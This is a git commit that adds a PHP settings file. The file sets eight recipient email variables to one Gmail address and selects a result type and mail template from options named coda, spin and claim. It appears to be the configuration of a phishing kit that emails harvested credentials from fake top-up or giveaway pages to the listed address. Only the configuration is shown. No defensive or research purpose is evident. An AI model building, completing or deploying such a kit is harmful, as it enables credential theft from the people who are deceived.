093f377f71343e50231040e493af399c5e2d8eeb
mairaverse <mairaverseid@gmail.com>
2024-11-16 08:33:43 +0700

    Add files via upload

---
+++ setting.php
@@ -0,0 +1,12 @@
+<?php
+$email1 = 'stokrenznesia12@gmail.com';
+$email2 = 'stokrenznesia12@gmail.com';
+$email3 = 'stokrenznesia12@gmail.com';
+$email4 = 'stokrenznesia12@gmail.com';
+$email5 = 'stokrenznesia12@gmail.com';
+$email6 = 'stokrenznesia12@gmail.com';
+$email7 = 'stokrenznesia12@gmail.com';
+$email8 = 'stokrenznesia12@gmail.com';
+$jenisress = $coda; //$coda, $spin, $claim
+$jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
+?>
